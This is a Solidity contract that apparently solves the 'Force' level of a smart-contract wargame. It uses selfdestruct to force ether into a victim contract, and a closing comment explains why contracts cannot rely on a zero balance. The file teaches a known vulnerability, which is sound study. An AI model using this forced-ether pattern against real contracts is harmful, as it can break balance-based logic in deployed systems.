// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '07-force.sol';

contract AttackForce {
    Force public forceContract; 

    //Initiallize the attacker contract with the address of the vitim contract.
    constructor(address vitimContractAddress){
        forceContract = Force(payable(vitimContractAddress));
    }

    // used to forcibly send ether to vitim contract
    function attack() public payable{
        require(msg.value > 0);
        // address for selfdesctruct MUST be PAYABLE
        address payable contactAddress = payable(address(forceContract));
        selfdestruct(contactAddress);
    }
}

/* give some wei when call attck it will force send ether to vintim contract. */

/*
Result

In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.

*/